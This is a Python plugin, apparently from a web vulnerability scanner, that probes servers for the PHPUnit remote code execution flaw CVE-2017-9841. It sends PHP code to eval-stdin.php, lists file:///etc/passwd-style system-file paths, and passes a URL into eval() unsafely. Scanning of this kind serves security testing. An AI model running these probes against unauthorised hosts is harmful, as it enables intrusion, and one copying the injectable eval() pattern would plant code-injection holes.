#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
PHPUnit 是 PHP 语言中最常见的单元测试 (unit testing) 框架
    PHPUnit扫描类: 
        1. PHPUnit 远程代码执行
            CVE-2017-9841
                Payload: https://vulhub.org/#/environments/phpunit/CVE-2017-9841/

file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.thread import thread
from payloads.phpUint.cve_2017_9841 import cve_2017_9841_scan

class phpUint():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'phpUint'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md
        
        self.randint_1, self.randint_2 = random_int_2() # * 获取2个随机整数, 用于回显漏洞判断

        self.cve_2017_9841_payloads = [
            {
                'path': 'vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',
                'data': '<?=print({}*{})?>'.format(self.randint_1, self.randint_2)
            },
        ]

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2017_9841_scan, url=url)
        ]

phpUint.cve_2017_9841_scan = cve_2017_9841_scan

phpunit = phpUint()
